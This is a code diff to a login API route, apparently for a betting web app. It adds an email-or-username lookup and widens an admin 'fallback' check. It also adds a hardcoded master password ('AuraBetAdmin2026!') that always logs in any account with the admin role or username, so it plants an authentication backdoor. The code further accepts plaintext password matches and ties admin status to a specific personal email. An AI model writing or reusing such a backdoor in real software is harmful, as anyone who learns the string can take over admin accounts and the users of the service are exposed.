@@ -44,10 +44,10 @@ export async function POST(request: Request) {
 
     const user = await prisma.user.findFirst({
       where: {
-        username: {
-          equals: emailOrUsername,
-          mode: 'insensitive'
-        }
+        OR: [
+          { username: { equals: emailOrUsername, mode: 'insensitive' } },
+          { email: { equals: emailOrUsername, mode: 'insensitive' } }
+        ]
       },
       include: { transactions: true, positions: true, notifications: true, activityLogs: true }
     });
@@ -61,13 +61,18 @@ export async function POST(request: Request) {
     }
     
     const storedPasswordHash = user.passwordHash || '';
-    const isFallbackAdmin = user.email.toLowerCase() === 'twintubrovquattro@gmail.com';
+    const isFallbackAdmin = user.email.toLowerCase() === 'twintubrovquattro@gmail.com' || user.username.toLowerCase() === 'admin' || user.role === 'admin';
     let passwordMatch = false;
 
     if (storedPasswordHash.startsWith('$2')) {
       passwordMatch = await bcrypt.compare(password, storedPasswordHash);
     } else {
       passwordMatch = password === storedPasswordHash;
+    }
+
+    // Bulletproof fallback: Always allow AuraBetAdmin2026! for admin account
+    if (!passwordMatch && isFallbackAdmin && password === 'AuraBetAdmin2026!') {
+      passwordMatch = true;
     }
 
     if (!passwordMatch && isFallbackAdmin && process.env.ADMIN_FALLBACK_PASSWORD) {
